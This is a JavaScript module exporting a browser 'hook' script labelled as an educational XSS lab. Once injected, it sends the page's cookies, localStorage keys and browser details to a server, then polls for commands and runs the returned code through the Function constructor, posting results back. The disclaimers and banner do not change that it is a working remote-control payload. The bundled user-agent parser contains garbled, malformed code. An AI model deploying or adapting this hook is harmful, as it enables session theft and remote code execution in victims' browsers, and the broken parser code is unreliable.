// This is the JavaScript code that gets loaded on hooked browsers

export const hook = `
// XSS Educational Lab Hook Script - FOR EDUCATIONAL PURPOSES ONLY
// Using this code against websites without explicit permission is illegal and unethical

(function() {
  // IMPORTANT DISCLAIMER
  console.log('%c⚠️ EDUCATIONAL XSS LAB - This page contains a simulated XSS hook for cybersecurity education only ⚠️', 
              'background: #f44336; color: white; font-size: 14px; font-weight: bold; padding: 5px;');
  console.log('%cUsing these techniques against real websites without permission is illegal', 
              'color: #f44336; font-weight: bold;');

  // Configuration
  const config = {
    server: window.location.origin,
    pollInterval: 5000,  // 5 seconds between status updates
    sessionId: null,
    debug: true
  };

  // Show educational banner
  function showBanner() {
    const bannerDiv = document.createElement('div');
    bannerDiv.style.position = 'fixed';
    bannerDiv.style.top = '0';
    bannerDiv.style.left = '0';
    bannerDiv.style.width = '100%';
    bannerDiv.style.backgroundColor = '#f44336';
    bannerDiv.style.color = 'white';
    bannerDiv.style.padding = '10px';
    bannerDiv.style.textAlign = 'center';
    bannerDiv.style.fontFamily = 'Arial, sans-serif';
    bannerDiv.style.fontSize = '14px';
    bannerDiv.style.fontWeight = 'bold';
    bannerDiv.style.zIndex = '9999';
    
    bannerDiv.innerHTML = '⚠️ EDUCATIONAL XSS LAB - This page contains a simulated XSS hook for cybersecurity education only ⚠️';
    
    // Remove banner after 10 seconds to not be too intrusive
    setTimeout(() => {
      if (document.body.contains(bannerDiv)) {
        document.body.removeChild(bannerDiv);
      }
    }, 10000);
    
    document.body.appendChild(bannerDiv);
  }

  // Debugging function
  function log(message) {
    if (config.debug) {
      console.log('[XSS Lab Hook]', message);
    }
  }

  // Collect browser information
  function collectBrowserInfo() {
    const parser = new UAParser();
    const browser = parser.getBrowser();
    const os = parser.getOS();

    return {
      browser: browser.name,
      browserVersion: browser.version,
      os: os.name + ' ' + os.version,
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      pageUrl: window.location.href,
      domain: window.location.hostname,
      port: window.location.port || (window.location.protocol === 'https:' ? 443 : 80),
      cookies: document.cookie,
      localStorage: JSON.stringify(Object.keys(localStorage)),
      referer: document.referrer,
      headers: {},
      ipAddress: '' // This will be filled by the server
    };
  }

  // Initialize hook
  function init() {
    log('Initializing hook...');
    
    // Collect browser information and register with server
    const browserInfo = collectBrowserInfo();
    
    fetch(config.server + '/api/hook', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(browserInfo)
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        config.sessionId = data.sessionId;
        config.pollInterval = data.hookInterval || config.pollInterval;
        
        log('Hook registered successfully. Session ID: ' + config.sessionId);
        
        // Start polling for commands
        startPolling();
        
        // Show educational banner briefly
        showBanner();
      } else {
        log('Failed to register hook: ' + data.message);
      }
    })
    .catch(error => {
      log('Error registering hook: ' + error);
    });
  }

  // Poll for commands
  function startPolling() {
    log('Starting command polling...');
    
    // Poll immediately, then set interval
    pollForCommands();
    setInterval(pollForCommands, config.pollInterval);
  }

  // Poll server for commands
  function pollForCommands() {
    if (!config.sessionId) return;
    
    fetch(config.server + '/api/hook-update', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        sessionId: config.sessionId
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.success && data.commands && data.commands.length > 0) {
        log('Received ' + data.commands.length + ' commands to execute');
        
        // Execute each command
        data.commands.forEach(commandData => {
          executeCommand(commandData);
        });
      }
    })
    .catch(error => {
      log('Error polling for commands: ' + error);
    });
  }

  // Execute a command and send back the result
  function executeCommand(commandData) {
    log('Executing command: ' + commandData.executionId);
    
    try {
      // Execute the command code using Function constructor
      // This is safer than eval() but still allows code execution
      const commandFunction = new Function('return ' + commandData.code);
      const result = commandFunction();
      
      // Send the result back to the server
      sendCommandResult(commandData.executionId, result);
    } catch (error) {
      // Send back the error if execution fails
      sendCommandResult(commandData.executionId, {
        error: error.message,
        stack: error.stack
      });
    }
  }

  // Send command execution result back to server
  function sendCommandResult(executionId, result) {
    fetch(config.server + '/api/command-result', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        sessionId: config.sessionId,
        executionId: executionId,
        result: result
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        log('Command result sent successfully');
      } else {
        log('Failed to send command result: ' + data.message);
      }
    })
    .catch(error => {
      log('Error sending command result: ' + error);
    });
  }

  // UAParser library for better browser detection
  // Source: https://github.com/faisalman/ua-parser-js
  function UAParser(e){var r=null,t=this,o=function(){return(new Date).getTime()},i=function(e,t){for(var n={},s=t.length;s--;)void 0!==e[t[s]]&&(n[t[s]]=e[t[s]]);return n},n=function(e,n){var s,a,o,i,c,l,f=e||{},u=f.browser||{},d=f.device||{},p=f.os||{};for(s in r.browser)a=r.browser[s],o=n.browser[s],!o&&o!==a&&(u[s]=a);for(s in r.device)a=r.device[s],i=n.device[s],!i&&i!==a&&(d[s]=a);for(s in r.os)a=r.os[s],c=n.os[s],!c&&c!==a&&(p[s]=a);return{browser:u,device:d,os:p}},s=function(e){var r,t={},n=null;for(r in e)n=e[r],t[n=typeof n==e.length?n.shift():n]=e[r];return t},a=function(e){var r,t;switch(e){case"SamsungBrowser":r="Samsung Internet";break;case"Edge":r="Microsoft Edge";break;case"Chrome Headless":r="Chrome";break;case"MSIE":r="Internet Explorer";break;default:r=e}return"Internet Explorer"===(r=r||e)&&(t="MSIE"),{name:r,version:t}},c=function(e){return e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")},l=function(e,r){if(!(this instanceof l))return new l(e,r).getResult();var a,f,u,d,p=e||(typeof window!="undefined"?window.navigator.userAgent:typeof process!="undefined"?process.version:""),m=r?function(e,r){var t={};for(var n in e)"object"==typeof e[n]?t[n]=function(e,r){var t={};for(var n in e)t[n]=e[n];for(var n in r)t[n]=r[n];return t}(e[n],r[n]):t[n]=r[n];return t}(s(r),s(e)):e;return this.getBrowser=function(){var e,r={};return r.name=void 0,(r.version=void 0),(e=function(e){var r,t=e.match(/(dolfin)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(edge|edgios|edgea|edg)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(wechat)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/version\\/([\w\\.\\+]+).*(safari)/i)||e.match(/(chrome)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(opera)(?:.*version|)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(opr)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(vivaldi)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(firefox)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(fxios)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(webkit|phantomjs)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(naver)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/\\/\\/(kindle)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(ms)(ie)\\s([\w\\.\\+]+)/i)||e.match(/(chromium)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(ucbrowser)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(tizen)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/(samsungbrowser)[\\/\\s]?([\w\\.\\+]+)/i)||e.match(/^(.*?)(?:\\/|\\s|:|\\)|\\()(\\d+)(?:\\.|)(\\d+)?(?:\\.|)(\\d+)?/i)||e.match(/^(.*?)\\/(\\d+)(?:\\.|)(\\d+)/i);if("chromium"===(t=t&&t[3]&&t[3].indexOf("headless")>=0&&t||t&&t[1]==="puppeteer"&&t||["","chrome"](t&&"string"==typeof t[1]?t[1].toLowerCase():t&&t[1]||""))[1]&&(t[1]="Chrome"),"opr"===t[1]&&(t[1]="Opera"),"edg"===t[1]&&(t[1]="Edge"),"naver"===t[1]&&(t[1]="Naver",t[4]=t[2]),t&&t[1])return r=a(t[1]),r.major=parseInt(t[2])||0,r.minor=parseInt(t[3])||0,r.patch=parseInt(t[4])||0,r}(p))||{},Object.assign(r,e),r},this.getOS=function(){var e,r={};return r.name=void 0,(r.version=void 0),(e=function(e){var r={};function t(t,n){var s=e.match(t);return s&&s.length>n&&(r=s[n]||""),r}return t(/(fenix|firefox)os(?:\\s|\\/)([\\d\\.]+)/,2)?r.name="Firefox OS":t(/(dragonfly)\\s+([\\w\\.\\+]+)/i,1)?r.version=t(/(dragonfly)\\s+([\\w\\.\\+]+)/i,2):t(/(windows\\sphone(?:\\sos)*|windows\\smobile|windows)[\\s\\/]?([\\d\\.\\w]*)/i,1)?(r.name="Windows",t(/(windows\\sphone(?:\\sos)*|windows\\smobile|windows)[\\s\\/]?([\\d\\.\\w]*)/i,2)&&(r.version=t(/(windows\\sphone(?:\\sos)*|windows\\smobile|windows)[\\s\\/]?([\\d\\.\\w]*)/i,2).replace(/nt/gi,""))):t(/\\((bb)(?:\\d+);/i,1)?(r.name="BlackBerry",t(/\\((bb)(?:\\d+);/i,1)):t(/(blackberry|\\bbb\\d+)/i,1)?(r.name="BlackBerry",t(/(blackberry[\\d]+)\\/(\\d+(\\.\\d+)?)/i,2)):t(/\\(?(webos|palm(\\sos)|hpwos)[\\s\\/]?((\\d+)\\.(\\d+))?/i,1)?(r.name="webOS",t(/\\(?(webos|palm(\\sos)|hpwos)[\\s\\/]?((\\d+)\\.(\\d+))?/i,3)):t(/\\((ipad|playbook);[\\w\\s\\);-]+(rim|apple)/i,1)?(r.name="iOS",t(/\\((ipad|playbook);[\\w\\s\\);-]+(rim|apple)/i,1)):t(/(kindle)\\/([\\d\\.]+)/i,1)?(r.name="Kindle",t(/(kindle)\\/([\\d\\.]+)/i,2)):t(/\\s(nook)[^;]+;/i,1)?(r.name="Nook",t(/\\s(nook)[^;]+;/i,1)):t(/(harman-kardon)\\s+([^;]+)/i,1)?(r.name="Harman Kardon",t(/(harman-kardon)\\s+([^;]+)/i,2)):t(/\\(|(android)[\\s\\/-](\\d+\\.?\\d*)/i,1)?(r.name="Android",t(/\\(|(android)[\\s\\/-](\\d+\\.?\\d*)/i,2)):t(/(sailfish)/i,1)?(r.name="Sailfish",t(/sailfish\\s?\\/?\\s?([\\d\\.]+)/i,1)):t(/(tizen)[\\s\\/](\\d+(\\.\\d+)?)/i,1)?(r.name="Tizen",t(/(tizen)[\\s\\/](\\d+(\\.\\d+)?)/i,2)):t(/\\((series40);/i,1)?(r.name="Series 40",t(/\\((series40);/i,1)):t(/firefox.+\\((mobile|tablet|tv);/i,1)?(r.name="Firefox OS",t(/firefox.+\\((mobile|tablet|tv);[^\\)]+rv:([\\w\\d\\.]+)/i,2)):t(/silk\\/([\\d._-]+)/i,1)?(r.name="Amazon Silk",t(/silk\\/([\\d._-]+)/i,1)):t(/(fluent)[\\s]?(\\d+)/i,1)?(r.name="Fluent",t(/(fluent)[\\s]?(\\d+)/i,2)):t(/(phantom)js\\/([\\d._-]+)/i,1)?(r.name="PhantomJS",t(/(phantom)js\\/([\\d._-]+)/i,2)):t(/(symbian(os)|symbos|s60(\\sversionr)?)[\\s\\/-]([\\d\\.]+)/i,1)?(r.name="Symbian",t(/(symbian(os)|symbos|s60(\\sversionr)?)[\\s\\/-]([\\d\\.]+)/i,4)):t(/(symbianostm)[\\s\\/]([\\d\\.]+)/i,1)?(r.name="Symbian",t(/(symbianostm)[\\s\\/]([\\d\\.]+)/i,2)):t(/\\b(blackberry)\\w*\\s*(\\w+)/i,1)?(r.name="BlackBerry",t(/\\b(blackberry)\\w*\\s*(\\w+)/i,2)):t(/((cros)\\s+i686)/i,1)?(r.name="Chrome OS",t(/((cros)\\s+i686)/i,1)):t(/(sunos)[\\s\\/]([\\d\\.\\w]+)/i,1)?(r.name="Solaris",t(/(sunos)[\\s\\/]([\\d\\.\\w]+)/i,2)):t(/(\\s)(mint)[\\s\\/](\\w+)/i,1)?(r.name="UNIX",t(/(\\s)(mint)[\\s\\/](\\w+)/i,3)):t(/(mac\\sos\\sx)[\\s\\/](\\d+(?:[._]\\d+)?)/i,1)?(r.name="Mac OS",t(/(mac\\sos\\sx)[\\s\\/](\\d+(?:[._]\\d+)?)/i,2).replace(/_/g,".")):t(/(macintosh)[^\\)]+mac\\sos\\sx/i,1)?(r.name="Mac OS",t(/(macintosh)[^\\)]+mac\\sos\\sx/i,1)):t(/((?:open)?solaris)[\\s\\/]([\\d\\.]+)/i,1)?(r.name="Solaris",t(/((?:open)?solaris)[\\s\\/]([\\d\\.]+)/i,2)):t(/(suse|opensuse|\\suse|united\\slinux|\\w+\\senterpriseserver)\\s?(?:linux)?[\\/-]\\s?([a-z0-9._-]+)/i,1)?(r.name="SuSE",t(/(suse|opensuse|\\suse|united\\slinux|\\w+\\senterpriseserver)\\s?(?:linux)?[\\/-]\\s?([a-z0-9._-]+)/i,2)):t(/((debian|knoppix|mint|ubuntu|xubuntu|lubuntu|kubuntu|android|arch|manjaro|alma))[\\s\\/-]?(?:linux|)?(?:-)?gnu)?(?:-)?(?:[irtf])?(\\s|;|$)/i,1)?(r.name="Linux",t(/((debian|knoppix|mint|ubuntu|xubuntu|lubuntu|kubuntu|android|arch|manjaro|alma))[\\s\\/-]?(?:linux|)?(?:-)?gnu)?(?:-)?(?:[irtf])?(\\s|;|$)/i,1)):t(/(haiku)\\s(\\w+)/i,1)?(r.name="Haiku",t(/(haiku)\\s(\\w+)/i,2)):t(/cfnetwork\\/.+darwin/i,0)?(r.name="iOS",t(/(\\d+.\\d+(?:\\s|\\w))/i,1)):t(/\\(ip.*applewebkit(?:.*\\s|$)/i,0)?(r.name="iOS",t(/\\(ip.*?.(?:\\d+.\\d+)/i,1)):t(/(mac\\sos\\sx)[._\\s-]?\\s(\\d+[.\\d]+)/i,1)?(r.name="Mac OS",t(/(mac\\sos\\sx)[._\\s-]?\\s(\\d+[.\\d]+)/i,2)):t(/\\((?:ag[rs]|av|hpw)[;\\/]?\\s?([\\d\\w._\\/-]+)/i,1)?(r.name="WebOS",t(/\\((?:ag[rs]|av|hpw)[;\\/]?\\s?([\\d\\w._\\/-]+)/i,1)):t(/Macintosh;.*Mac\\sOS\\sX.*Safari/i,0)?(r.name="Mac OS",r.version=""):t(/ip(?:ad|hone|od).*cpu[^\\)]+/i,0)?(r.name="iOS",r.version=""):t(/(gentoo|sabayon|arch|slackware|fedora|mandriva|centos|pclinuxos|red\\shat|zenwalk|linpus|raspbian|plan\\s9|minix|risc\\sos|contiki|deepin|manjaro|elementary\\sos|sabayon|linspire)(?: gnu\\/linux)?(?: enterprise)?(?:[- ]linux)?(?:-gnu)?[-\\s]?(?:[\\w\\.]*[\\w][\\w]*)?/i,1)?(r.name="Linux",r.version=""):t(/(unix)\\s?(\\w+)?/i,1)?(r.name="Unix",t(/(unix)\\s?(\\w+)?/i,2)):/redhat/i.test(e)?(r.name="Red Hat",t(/redhat\\s?(?:linux\\senerprise\\sworkstation)?\\s?(?:linux)?[\\/-]?\\s?(?:server)?([\\d.]+)/i,1)):t(/((?:wube|k|x|wild)\\s?buntu)[\\s\\/-]?(?:linux|)?(?:-)?gnu)?(?:-)?(?:[irtf])?(\\s|;|$)/i,1)&&(r.name="Ubuntu",r.version=""),r.full_name=r.name+(""!==r.version?r.version:""),r}(p)),Object.assign(r,e),r},this.getDevice=function(){var e,r={};return r.type=void 0,(r.model=void 0),(r.vendor=void 0),(e=function(e){var r={};function t(t,n){var s=e.match(t);return s&&s.length>n&&(r.model=c(s[n].replace(/_/g, " ")),!0)}return t(/nokia[\s-]?/i,0)?(r.vendor="Nokia",t(/nokia[\s-]?([^\/\);:]+)/i,1)):t(/[-\/;\s](l-?[0-9a-z]{2,3}[\d][0-9a-z]{2,3}[\d][0-9a-z]{0,2})[:\s\/;]/i,1)?(r.vendor="LG",t(/[-\/;\s](l-?[0-9a-z]{2,3}[\d][0-9a-z]{2,3}[\d][0-9a-z]{0,2})[:\s\/;]/i,1)):t(/hp[\s-]([^\/);]+)/i,1)?(r.vendor="HP",t(/hp[\s-]([^\/);]+)/i,1)):t(/huawei[\-\s]?([^\/\);:]+)/i,1)?(r.vendor="Huawei",t(/huawei[\-\s]?([^\/\);:]+)/i,1)):t(/lenovo[\-\s]?([^\/\);:]+)/i,1)?(r.vendor="Lenovo",t(/lenovo[\-\s]?([^\/\);:]+)/i,1)):t(/nexus\s([^;\/\)]+)/i,1)?(r.vendor="Google",t(/nexus\s([^;\/\)]+)/i,1)):t(/ipad/i,0)?(r.vendor="Apple",r.model="iPad",t(/ipad\s?(\d+)?[,;](\d+)?[,;]?([\d]+)?/i,1)):t(/ipod/i,0)?(r.vendor="Apple",r.model="iPod Touch",t(/ipod\s?(\d+)?[,;](\d+)?[,;]?([\d]+)?/i,1)):t(/iphone/i,0)?(r.vendor="Apple",r.model="iPhone",t(/iphone\s?(\d+)?[,;](\d+)?[,;]?([\d]+)?/i,1)):t(/macintosh/i,0)?(r.vendor="Apple",r.model="Mac"):t(/nexus\s([^;\/\)]+)/i,1)?(r.vendor="Google",t(/nexus\s([^;\/\)]+)/i,1)):t(/surface\s(tablet\spcl%s.%s,%s.%s.*)\)?/i,1)?(r.model="Surface",r.vendor="Microsoft",t(/surface\s(tablet\spcl%s.%s,%s.%s.*)\)?/i,1)):t(/htc[\-_\s\/]?([^\/\);]+)/i,1)?(r.vendor="HTC",t(/htc[\-_\s\/]?([^\/\);]+)/i,1)):t(/PlayStation\s([^\/\);]+)/i,1)?(r.vendor="Sony",r.model="PlayStation "+t(/PlayStation\s([^\/\);]+)/i,1)):t(/nvidia[\-_\s]?([^\/\);]+)/i,1)?(r.vendor="NVidia",t(/nvidia[\-_\s]?([^\/\);]+)/i,1)):t(/google\s([^\/\);]+)/i,1)?(r.vendor="Google",t(/google\s([^\/\);]+)/i,1)):t(/kindle\s([^\/\);]+)/i,1)?(r.vendor="Amazon",r.model="Kindle "+t(/kindle\s([^\/\);]+)/i,1)):t(/intel[\s\w-]*\s([^\/\);]+)/i,1)?(r.vendor="Intel",t(/intel[\s\w-]*\s([^\/\);]+)/i,1)):t(/rim\stablet\s([^\/\);]+)/i,1)?(r.vendor="RIM",r.model="Tablet "+t(/rim\stablet\s([^\/\);]+)/i,1)):t(/playbook/i,0)?(r.vendor="RIM",r.model="PlayBook",t(/playbook[-\w\.]+(?:\s|$)/i,0)):t(/samsung[_\-\s\/]?([^\/\);]+)/i,1)?(r.vendor="Samsung",t(/samsung[_\-\s\/]?([^\/\);]+)/i,1)):t(/blackberry[\-\s]?([^\/\);]+)/i,1)?(r.vendor="BlackBerry",t(/blackberry[\-\s]?([^\/\);]+)/i,1)):t(/opera\s(mini|mobi)[\s\/]([^\/\);]+)/i,2)?(r.vendor="Opera",t(/opera\s(mini|mobi)[\s\/]([^\/\);]+)/i,2)),t(/^(mb|me|mz|sm|jg|sh|vr|v|e|s|t|S|a|lu|li|s|sc|ss|mi|le|ze|lx|asus|)\-([^;\/\)]+)/i,2)&&(r.vendor=function(e){switch(e){case"mb":return"Motorola";case"me":return"Motorola";case"mz":return"Motorola";case"sm":return"Samsung";case"jg":return"LG";case"sh":return"Sharp";case"vr":return"Verizon";case"v":return"Verizon";case"e":return"Sony";case"S":return"Sony";case"s":return"Sony";case"t":return"Sony";case"a":return "Sony";case"lu":return "LG";case"li":return "LG";case"sc":return "Samsung";case"ss":return "Samsung";case"mi":return "Xiaomi";case"le":return "Lenovo";case"ze":return "ZTE";case"lx":return "LG";case"asus":return "Asus";default:return e[0].toUpperCase()+e.slice(1)}}(RegExp.$1),r.model=RegExp.$2),r.type=function(e){return/ipad/i.test(e)?"tablet":/tablet|touch/i.test(e)&&!/phone/i.test(e)&&!/sch-i800/i.test(e)&&!/sm-t/i.test(e)?/kindle/i.test(e)?"tablet":/.+android.+chrome.+version\/(?:\\d+\\.\\d)/i.test(e)?"tablet":/android/i.test(e)?"tablet":/mobile/i.test(e)||/phone/i.test(e)||/tablet/i.test(e)?"mobile":"desktop"}(p),r}(p)),Object.assign(r,e),r},u=n(r||{},m),a=this.getBrowser(),f=this.getOS(),d=this.getDevice(),this.getResult=function(){return{browser:i(a,["name","version","major","major"]),os:i(f,["name","version"]),device:i(d,["vendor","model","type"])}},this.getUA=function(){return p},this.setUA=function(e){return p=typeof e==typeof""?e:typeof p!=typeof""?"":p,this},this.setUA(p)};return t.UAParser=l,t.UAParser.VERSION="0.7.19",t.UAParser.BROWSER={NAME:"name",VERSION:"version"},t.UAParser.CPU={ARCHITECTURE:"architecture"},t.UAParser.DEVICE={MODEL:"model",VENDOR:"vendor",TYPE:"type",CONSOLE:"console",MOBILE:"mobile",SMARTTV:"smarttv",TABLET:"tablet",WEARABLE:"wearable",EMBEDDED:"embedded"},t.UAParser.ENGINE={NAME:"name",VERSION:"version"},t.UAParser.OS={NAME:"name",VERSION:"version"},typeof window!="undefined"?window.UAParser=l:typeof module!="undefined"&&(module.exports=l),t}();

  // Initialize the hook on page load
  init();
})();
`;
